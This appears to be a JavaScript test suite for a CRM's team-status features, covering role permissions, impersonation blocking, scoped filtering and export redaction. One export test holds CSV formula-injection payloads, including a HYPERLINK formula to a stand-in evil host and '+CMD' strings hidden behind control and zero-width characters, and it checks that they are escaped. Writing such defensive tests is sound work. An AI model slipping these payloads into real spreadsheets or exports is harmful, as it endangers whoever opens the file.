'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const Database = require('better-sqlite3');

const {
  PERMISSION_DEFINITIONS,
  ROLE_PERMISSIONS,
  SALES_ROUTE_POLICIES,
  assertPolicyAllowed,
  normalizePermissions,
  policyForSalesRequest,
} = require('../lib/access_control');
const {
  FILTER_DEFINITIONS,
  PAGE_REQUIRED_PERMISSIONS,
} = require('../lib/filter_catalog');
const {
  effectiveFilterSchemaFor,
  getFilterPermissionVersion,
  installFilterAuthorization,
  listFilterDefinitions,
} = require('../lib/filter_authorization');
const {
  FILTER_PAGES,
  exportTeamStatusRows,
  normalizeAuthorizedTeamStatusFilters,
  teamStatusViewKey,
} = require('../lib/team_status_filters');
const {
  exportTeamStatus,
  installTeamStatusSchema,
  listCollaborationSupport,
  recordExternalAssistance,
} = require('../lib/team_status');

const NOW = '2026-08-02 12:00:00';
const ENABLED_ENV = Object.freeze({ CRM_TEAM_STATUS_WRITES_ENABLED: 'true' });

function actor(id, role, patch = {}) {
  return {
    id,
    role,
    permission_group_id: `GROUP-${role}`,
    permissions: { ...ROLE_PERMISSIONS[role], ...patch },
  };
}

const admin = () => actor('ADMIN', 'admin');
const manager = () => actor('MANAGER', 'manager');
const sales = (id = 'SALES-A', patch = {}) => actor(id, 'sales', {
  view_team: true,
  ...patch,
});

function authorizationDb() {
  const db = new Database(':memory:');
  db.pragma('foreign_keys = ON');
  db.exec(`
    CREATE TABLE permission_groups (
      id TEXT PRIMARY KEY, name TEXT NOT NULL, role_key TEXT NOT NULL,
      permissions_json TEXT NOT NULL
    );
    CREATE TABLE sales_users (
      id TEXT PRIMARY KEY, name TEXT NOT NULL DEFAULT '', role TEXT NOT NULL,
      active INTEGER NOT NULL DEFAULT 1, permission_group_id TEXT NOT NULL,
      permissions_json TEXT NOT NULL DEFAULT '{}'
    );
    CREATE TABLE user_permission_overrides (
      user_id TEXT NOT NULL, permission_key TEXT NOT NULL, effect TEXT NOT NULL,
      PRIMARY KEY(user_id,permission_key)
    );
  `);
  const addGroup = db.prepare(`INSERT INTO permission_groups
    (id,name,role_key,permissions_json) VALUES (?,?,?,?)`);
  const addUser = db.prepare(`INSERT INTO sales_users
    (id,name,role,permission_group_id) VALUES (?,?,?,?)`);
  for (const role of ['admin', 'manager', 'sales']) {
    addGroup.run(`GROUP-${role}`, role, role, JSON.stringify(ROLE_PERMISSIONS[role]));
  }
  addUser.run('ADMIN', '老板', 'admin', 'GROUP-admin');
  addUser.run('MANAGER', '主管', 'manager', 'GROUP-manager');
  addUser.run('SALES-A', '销售甲', 'sales', 'GROUP-sales');
  addUser.run('SALES-B', '销售乙', 'sales', 'GROUP-sales');
  installFilterAuthorization(db, { now: NOW });
  return db;
}

function serviceDb() {
  const db = new Database(':memory:');
  db.pragma('foreign_keys = ON');
  db.exec(`
    CREATE TABLE sales_users (
      id TEXT PRIMARY KEY, name TEXT NOT NULL, role TEXT NOT NULL,
      active INTEGER NOT NULL DEFAULT 1
    );
    CREATE TABLE crm_accounts (
      id TEXT PRIMARY KEY, external_customer_id TEXT NOT NULL UNIQUE,
      company_name TEXT NOT NULL, owner_id TEXT, stage TEXT NOT NULL DEFAULT 'contacted',
      assignment_status TEXT NOT NULL DEFAULT 'claimed',
      lifecycle_status TEXT NOT NULL DEFAULT 'active', is_test_data INTEGER NOT NULL DEFAULT 0,
      created_at TEXT NOT NULL, updated_at TEXT NOT NULL
    );
    CREATE TABLE crm_activities (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, user_id TEXT NOT NULL,
      activity_type TEXT NOT NULL, superseded_at TEXT NOT NULL DEFAULT '',
      occurred_at TEXT NOT NULL, created_at TEXT NOT NULL
    );
    CREATE TABLE crm_rfqs (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, activity_id TEXT NOT NULL DEFAULT '',
      received_at TEXT NOT NULL, created_at TEXT NOT NULL
    );
    CREATE TABLE crm_quotes (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, activity_id TEXT NOT NULL DEFAULT '',
      sent_at TEXT NOT NULL, created_at TEXT NOT NULL
    );
    CREATE TABLE crm_orders (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, activity_id TEXT NOT NULL DEFAULT '',
      ordered_at TEXT NOT NULL, created_at TEXT NOT NULL
    );
    CREATE TABLE crm_deferred_plan_events (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, actor_id TEXT NOT NULL,
      owner_id_snapshot TEXT NOT NULL DEFAULT '', review_at TEXT NOT NULL DEFAULT '',
      reason TEXT NOT NULL DEFAULT '', source TEXT NOT NULL DEFAULT '',
      source_event_id TEXT NOT NULL DEFAULT '', created_at TEXT NOT NULL
    );
    CREATE TABLE crm_next_plan_events (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, actor_id TEXT NOT NULL,
      owner_id_snapshot TEXT NOT NULL DEFAULT '', next_action TEXT NOT NULL DEFAULT '',
      next_action_at TEXT NOT NULL DEFAULT '', source TEXT NOT NULL DEFAULT '',
      source_event_id TEXT NOT NULL DEFAULT '', created_at TEXT NOT NULL
    );
    CREATE TABLE crm_manager_tasks (
      id TEXT PRIMARY KEY, customer_id TEXT NOT NULL, status TEXT NOT NULL,
      owner_id_snapshot TEXT NOT NULL DEFAULT '', triggered_at TEXT NOT NULL,
      due_at TEXT NOT NULL DEFAULT '', escalated_at TEXT NOT NULL DEFAULT '',
      created_at TEXT NOT NULL, updated_at TEXT NOT NULL
    );
    CREATE TABLE crm_manager_interventions (
      id TEXT PRIMARY KEY, task_id TEXT NOT NULL, actor_id TEXT NOT NULL,
      action TEXT NOT NULL, created_at TEXT NOT NULL
    );
    CREATE TABLE crm_audit_log (
      id TEXT PRIMARY KEY, user_id TEXT NOT NULL, action TEXT NOT NULL,
      entity_type TEXT NOT NULL, entity_id TEXT NOT NULL DEFAULT '',
      detail_json TEXT NOT NULL DEFAULT '{}', created_at TEXT NOT NULL,
      real_user_id TEXT NOT NULL DEFAULT '', effective_user_id TEXT NOT NULL DEFAULT '',
      impersonation_context_id TEXT NOT NULL DEFAULT ''
    );
    INSERT INTO sales_users VALUES
      ('ADMIN','老板','admin',1),
      ('MANAGER','主管','manager',1),
      ('SALES-A','销售甲','sales',1),
      ('SALES-B','销售乙','sales',1);
    INSERT INTO crm_accounts VALUES
      ('ACC-A','EXT-A','甲客户','SALES-A','contacted','claimed','active',0,'2026-01-01', '${NOW}'),
      ('ACC-B','EXT-B','乙客户','SALES-B','contacted','claimed','active',0,'2026-01-01', '${NOW}');
  `);
  installTeamStatusSchema(db, { now: NOW });
  return db;
}

function recordFor(db, salesUserId, customerId, key, now) {
  return recordExternalAssistance(db, manager(), {
    salesUserId,
    customerId,
    problem: `${customerId} 的业务问题`,
    suggestion: '主管建议',
    outcome: '',
    nextStep: '继续处理',
    status: 'unresolved',
    idempotencyKey: key,
  }, { env: ENABLED_ENV, now });
}

function validFilter(definition, userId = 'SALES-A') {
  if (definition.type === 'text') {
    return { key: definition.key, operator: 'contains', value: '客户' };
  }
  if (definition.type === 'date_range') {
    return { key: definition.key, operator: 'between', from: '2026-08-01', to: '2026-08-02' };
  }
  const values = {
    owner: userId,
    progress_kind: 'progressed',
    collaboration_status: 'unresolved',
    collaboration_source: 'manual',
    collaboration_relation: 'original',
  };
  return { key: definition.key, operator: 'in', values: [values[definition.key] || 'value'] };
}

test('team status write permission is registered with least-privilege defaults', () => {
  assert.equal(PERMISSION_DEFINITIONS.view_team, '团队状态');
  assert.equal(PERMISSION_DEFINITIONS.record_collaboration_support, '补记协作支持');
  assert.equal(ROLE_PERMISSIONS.admin.record_collaboration_support, true);
  assert.equal(ROLE_PERMISSIONS.manager.record_collaboration_support, true);
  assert.equal(ROLE_PERMISSIONS.sales.record_collaboration_support, false);
  assert.deepEqual(normalizePermissions({
    record_collaboration_support: 1,
    forged_team_status_admin: true,
  }), { record_collaboration_support: true });
});

test('team status routes are explicit and only state-changing routes block impersonation', () => {
  const cases = [
    ['GET', '/team-status', { permissions: ['view_team'] }],
    ['POST', '/team-status/since-last-view', {
      permissions: ['view_team'], blockedWhileImpersonating: true,
    }],
    ['GET', '/team-status/export', { permissions: ['view_team', 'export_data'] }],
    ['GET', '/collaboration-support', { permissions: ['view_customers'] }],
    ['GET', '/collaboration-support/export', {
      permissions: ['view_customers', 'export_data'],
    }],
    ['POST', '/collaboration-support', {
      permissions: ['record_collaboration_support'], blockedWhileImpersonating: true,
    }],
    ['POST', '/collaboration-support/EVENT-1/supplements', {
      permissions: ['record_collaboration_support'], blockedWhileImpersonating: true,
    }],
    ['POST', '/collaboration-support/EVENT-1/corrections', {
      permissions: ['record_collaboration_support'], blockedWhileImpersonating: true,
    }],
    ['POST', '/collaboration-support/EVENT-1/revocations', {
      permissions: ['record_collaboration_support'], blockedWhileImpersonating: true,
    }],
  ];
  for (const [method, route, expected] of cases) {
    assert.deepEqual(policyForSalesRequest(method, route), expected, `${method} ${route}`);
    assert.deepEqual(policyForSalesRequest(method, `/api/sales-crm${route}`), expected);
    if (expected.blockedWhileImpersonating) {
      assert.throws(
        () => assertPolicyAllowed(expected, { isImpersonating: true }),
        error => error.code === 'IMPERSONATION_ACTION_BLOCKED',
      );
    } else {
      assert.doesNotThrow(() => assertPolicyAllowed(expected, { isImpersonating: true }));
    }
  }
  for (const [method, route] of [
    ['PATCH', '/team-status'],
    ['GET', '/collaboration-support/EVENT-1/corrections'],
    ['POST', '/collaboration-support/EVENT-1/corrections/extra'],
  ]) {
    assert.deepEqual(policyForSalesRequest(method, route), { deny: true });
  }
  assert.equal(
    SALES_ROUTE_POLICIES['POST /collaboration-support/:eventId/corrections']
      .blockedWhileImpersonating,
    true,
  );
});

test('team status filter catalog and runtime validator expose exactly the same authorized fields', () => {
  const db = authorizationDb();
  try {
    assert.deepEqual(PAGE_REQUIRED_PERMISSIONS[FILTER_PAGES.progress], ['view_team']);
    assert.deepEqual(PAGE_REQUIRED_PERMISSIONS[FILTER_PAGES.collaboration], ['view_customers']);
    for (const [page, user] of [
      [FILTER_PAGES.progress, admin()],
      [FILTER_PAGES.collaboration, admin()],
      [FILTER_PAGES.progress, manager()],
      [FILTER_PAGES.collaboration, sales()],
    ]) {
      const schema = effectiveFilterSchemaFor(db, user, page);
      assert.ok(schema.filters.length, `${page} must expose authorized filters`);
      for (const definition of schema.filters) {
        const input = { page, filters: [validFilter(definition, user.id)] };
        assert.doesNotThrow(
          () => normalizeAuthorizedTeamStatusFilters(user, input),
          `${page}.${definition.key} is advertised but rejected by runtime`,
        );
      }
    }
  } finally {
    db.close();
  }
});

test('existing filter catalogs migrate team status pages once and invalidate stale versions', () => {
  const db = authorizationDb();
  try {
    const migrationKey = 'issue174-team-status-pages-v1';
    db.prepare('DELETE FROM filter_catalog_migrations WHERE migration_key=?').run(migrationKey);
    for (const definition of listFilterDefinitions(db)) {
      const pages = definition.pages.filter(page => !Object.values(FILTER_PAGES).includes(page));
      db.prepare('UPDATE filter_definitions SET pages_json=? WHERE filter_key=?')
        .run(JSON.stringify(pages), definition.key);
    }
    const before = getFilterPermissionVersion(db);
    installFilterAuthorization(db, { now: '2026-08-02 13:00:00' });
    assert.equal(getFilterPermissionVersion(db), before + 1);
    assert.ok(db.prepare(
      'SELECT 1 FROM filter_catalog_migrations WHERE migration_key=?',
    ).get(migrationKey));
    const migrated = getFilterPermissionVersion(db);
    installFilterAuthorization(db, { now: '2026-08-02 14:00:00' });
    assert.equal(getFilterPermissionVersion(db), migrated);
    const normalized = normalizeAuthorizedTeamStatusFilters(admin(), {
      page: FILTER_PAGES.progress,
      filters: [],
    });
    const oldKey = teamStatusViewKey(admin(), normalized, { permissionVersion: before });
    const newKey = teamStatusViewKey(admin(), normalized, { permissionVersion: migrated });
    assert.notEqual(oldKey, newKey);
  } finally {
    db.close();
  }
});

test('sales cannot forge another owner filter or record collaboration support', () => {
  assert.throws(
    () => normalizeAuthorizedTeamStatusFilters(sales(), {
      page: FILTER_PAGES.collaboration,
      filters: [{ key: 'owner', operator: 'in', values: ['SALES-B'] }],
    }),
    error => error.statusCode === 403 && error.code === 'FILTER_NOT_AUTHORIZED',
  );
  const db = serviceDb();
  try {
    assert.throws(
      () => recordExternalAssistance(db, sales(), {
        salesUserId: 'SALES-A', customerId: 'EXT-A', problem: '问题', suggestion: '建议',
        outcome: '', nextStep: '下一步', status: 'unresolved', idempotencyKey: 'SALES-FORGED',
      }, { env: ENABLED_ENV, now: NOW }),
      error => error.statusCode === 403,
    );
    assert.equal(db.prepare('SELECT COUNT(*) count FROM crm_collaboration_events').get().count, 0);
  } finally {
    db.close();
  }
});

test('admin, manager, and sales collaboration scopes preserve list, count, and pagination parity', () => {
  const db = serviceDb();
  try {
    recordFor(db, 'SALES-A', 'EXT-A', 'EVENT-A', '2026-08-02 12:01:00');
    recordFor(db, 'SALES-B', 'EXT-B', 'EVENT-B', '2026-08-02 12:02:00');
    const input = { page: 1, pageSize: 1, filters: { page: FILTER_PAGES.collaboration, filters: [] } };
    const adminPage = listCollaborationSupport(db, admin(), input, { now: NOW });
    const managerPage = listCollaborationSupport(db, manager(), input, { now: NOW });
    const salesPage = listCollaborationSupport(db, sales(), input, { now: NOW });
    assert.deepEqual(
      { total: adminPage.total, authorizedTotal: adminPage.authorizedTotal, hasMore: adminPage.hasMore },
      { total: 2, authorizedTotal: 2, hasMore: true },
    );
    assert.deepEqual(
      { total: managerPage.total, authorizedTotal: managerPage.authorizedTotal },
      { total: 2, authorizedTotal: 2 },
    );
    assert.deepEqual(
      { total: salesPage.total, authorizedTotal: salesPage.authorizedTotal, hasMore: salesPage.hasMore },
      { total: 1, authorizedTotal: 1, hasMore: false },
    );
    assert.deepEqual(salesPage.rows.map(row => row.salesUserId), ['SALES-A']);
    assert.equal(JSON.stringify(salesPage).includes('EXT-B'), false);
  } finally {
    db.close();
  }
});

test('authorized exports reuse scoped rows and always redact AI and assignment decision fields', () => {
  const db = serviceDb();
  try {
    recordFor(db, 'SALES-A', 'EXT-A', 'EVENT-A', '2026-08-02 12:01:00');
    recordFor(db, 'SALES-B', 'EXT-B', 'EVENT-B', '2026-08-02 12:02:00');
    const scopedSales = sales('SALES-A', { export_data: true });
    const input = {
      section: 'collaboration',
      format: 'json',
      filters: { page: FILTER_PAGES.collaboration, filters: [] },
    };
    const listed = listCollaborationSupport(db, scopedSales, input, { now: NOW });
    const exported = exportTeamStatus(db, scopedSales, input, {
      now: NOW,
      hardFlags: { ai_stations: false },
    });
    assert.deepEqual(exported.rows, listed.rows);
    assert.equal(exported.content.includes('EXT-B'), false);
    assert.doesNotMatch(
      exported.content,
      /aiScore|aiRecommendation|candidate|assignmentReason|exclusionReason|quota|workload/i,
    );

    const redacted = exportTeamStatusRows([{
      eventId: 'SAFE',
      salesUserId: 'SALES-A',
      aiScore: 99,
      aiRecommendation: '隐藏建议',
      candidateSales: ['SALES-B'],
      assignmentReason: '关键数据',
      exclusionReason: '关键数据',
      quota: 10,
      workload: 8,
    }], { format: 'csv', includeAI: false });
    assert.match(redacted.content, /SAFE/);
    assert.doesNotMatch(
      redacted.content,
      /aiScore|aiRecommendation|candidate|assignmentReason|exclusionReason|quota|workload|隐藏建议|关键数据/i,
    );
    const formulaSafe = exportTeamStatusRows([{
      problem: '=HYPERLINK("https://evil.invalid")',
      suggestion: ' +CMD',
      outcome: '-1+1',
      nextStep: '@SUM(1,1)',
      nulPrefixed: '\u0000=1+1',
      verticalTabPrefixed: '\u000b@SUM(1,1)',
      unitSeparatorPrefixed: '\u001f-CMD',
      deletePrefixed: '\u007f+CMD',
      noBreakSpacePrefixed: '\u00a0=1+1',
      zeroWidthPrefixed: '\u200b@SUM(1,1)',
      bomPrefixed: '\ufeff-CMD',
    }], { format: 'csv' });
    assert.match(formulaSafe.content, /'=/);
    assert.match(formulaSafe.content, /' \+CMD/);
    assert.match(formulaSafe.content, /'-1\+1/);
    assert.match(formulaSafe.content, /'@SUM/);
    assert.match(formulaSafe.content, /'\u0000=1\+1/);
    assert.match(formulaSafe.content, /'\u000b@SUM/);
    assert.match(formulaSafe.content, /'\u001f-CMD/);
    assert.match(formulaSafe.content, /'\u007f\+CMD/);
    assert.match(formulaSafe.content, /'\u00a0=1\+1/);
    assert.match(formulaSafe.content, /'\u200b@SUM/);
    assert.match(formulaSafe.content, /'\ufeff-CMD/);
  } finally {
    db.close();
  }
});
